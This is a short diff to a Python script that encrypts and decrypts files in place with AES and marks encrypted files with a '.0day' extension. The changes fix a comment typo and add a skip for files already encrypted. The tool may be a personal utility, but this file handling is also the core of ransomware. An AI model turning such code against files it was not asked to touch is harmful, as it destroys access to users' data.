@@ -1,5 +1,5 @@
 import os, sys, stat
-from Cryptodome.Cipher import AES     # Pyryptodomex has been used to prevent any
+from Cryptodome.Cipher import AES     # Pycryptodomex has been used to prevent any
 from Cryptodome import Random         # collision with Pycrypto/Pycryptodome packages.
 import hashlib                        # Use pip (or conda) install cryptodomex.
 
@@ -48,6 +48,9 @@ def encrypt(filepath, key):
   path = os.path.normpath(filepath)
   ext = '.0day'
   
+  if path.endswith(ext):
+    return
+  
   try:
     keyb = hashlib.sha3_256(key.encode()).digest()
     iv = Random.new().read(AES.block_size)
@@ -77,7 +80,7 @@ def decrypt(filepath, key):
   ext = '.0day'
   
   if not path.endswith(ext):
-    return 'Unsupported file'
+    return
   
   try:
     with open(path, 'rb+') as f:
